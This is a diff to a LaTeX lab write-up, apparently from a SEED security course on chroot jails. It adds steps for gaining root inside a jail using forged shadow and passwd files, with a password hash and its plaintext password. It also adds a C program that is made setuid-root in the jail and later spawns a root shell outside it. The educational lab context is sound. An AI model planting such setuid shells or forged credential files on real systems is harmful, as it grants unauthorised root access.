@@ -245,9 +245,54 @@ Hard links are used all over the operating system to point to given location in 
 \emph{Set-root-UID} programs can be run inside \texttt{chroot} jail.
 
 \subsubsection{Getting root with \texttt{su}}
-It is possible to gain root privileges using \texttt{/tmp/su}
+It is possible to gain root privileges using \texttt{/tmp/su}. The \texttt{su} command uses \texttt{/etc/shadow} and \texttt{/etc/passwd} to verify super user authentication. We can create these files in jail---see \textbf{Listing~\ref{chroot:shadow}~and~\ref{chroot:passwd}}---to allow such authentication.\\
+In this example we used known password hash of \texttt{seed} user with changed first line form \texttt{seed} to \texttt{root}, and the second file is just custom entry for root user.\\
+These operations facilitate gaining \texttt{root} privileges within jail using seed password, namely ``dees''.
+
+\vspace{1em}
+\lstset{
+  captionpos=b,
+  frame=single,
+  caption=\texttt{shadow} file in jail.,
+  label=chroot:shadow
+}
+\begin{lstlisting}
+root:$6$5MfvmFOaDU$CVt7jU9wJRYz3K98EklAJqp8RMG5NvReUSVK7ctVvc2VOn
+   YVrvyTfXaIgHn2xQS78foEJZBq2oCIqwfdNp.2V1:14400:0:99999:7:::
+\end{lstlisting}
+\vspace{1em}
+\lstset{
+  captionpos=b,
+  frame=single,
+  language=bash,
+  breaklines=true,
+  caption=\texttt{passwd} file in jail.,
+  label=chroot:passwd
+}
+\begin{lstlisting}
+root:x:0:0:root:/root:/bin/bash
+\end{lstlisting}
 
 \subsubsection{Preserve root privileges after exiting jail}
+It is possible to regain root privileges once exited the jail. To this end, we write simple \texttt{C} program shown in \textbf{Listing~\ref{chroot:regainingroot}}. Once compiled, we apply set-root-UID to it by executing \texttt{chown root prog} and \texttt{chmod 4755 prog}.\\
+After leaving \textt{chroot} jail we execute this program and gain root privileges in non-restricted environment. This technique works as set-root-UID done in jail is not removed while exiting it hence normal user can run this script which in turn calls \textt{su -c "/bin/bash"} as a root resulting in root shell.
+
+\vspace{1em}
+\lstset{
+  captionpos=b,
+  frame=single,
+  language=C,
+  breaklines=true,
+  caption=Simple \texttt{C} code allowing to regain \texttt{root} privileges.,
+  label=chroot:regainingroot
+}
+\begin{lstlisting}
+int main(){
+setuid(0);
+system("su -c \"/bin/bash\"");
+return 0;
+}
+\end{lstlisting}
 
 \subsection{Breaking out of a \texttt{chroot} jail}
 \subsubsection{\texttt{cd ..} out of jail}
